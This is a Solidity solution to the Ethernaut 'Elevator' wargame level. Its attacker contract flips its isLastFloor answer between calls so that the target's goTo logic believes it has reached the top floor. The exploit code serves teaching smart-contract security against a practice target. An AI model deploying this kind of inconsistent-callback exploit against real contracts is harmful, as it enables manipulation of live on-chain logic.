// Solution to level "Elevator" of Ethernaut challenges
// How to break this level and get to the top?
// Implement a function `isLastFloor`
// Inside that function, implement a kind of "switch" mechanism
// It will return false if called the first time, then return true if called second time, return false again if called 3rd time and so on
// Implement an `attack` function to call `goto` function on the target contract
// Deploy this contract and call the attack function from it

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract ElevatorAttacker {
    address private target = 0x0000000000000000000000000000000000000000;
    bool private my_switch = false;

    function isLastFloor(uint256) external returns (bool) {
        if (!my_switch) {
            my_switch = true;
            return false;
        }
        my_switch = false;
        return true;
    }

    function attack(uint256 _floor) external returns (bytes memory) {
        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("goTo(uint256)", _floor)
        );
        require(success, "Attack failed");
        return data;
    }

    function changeTargetAddress(address _newTargetAddress) external {
        target = _newTargetAddress;
    }
}
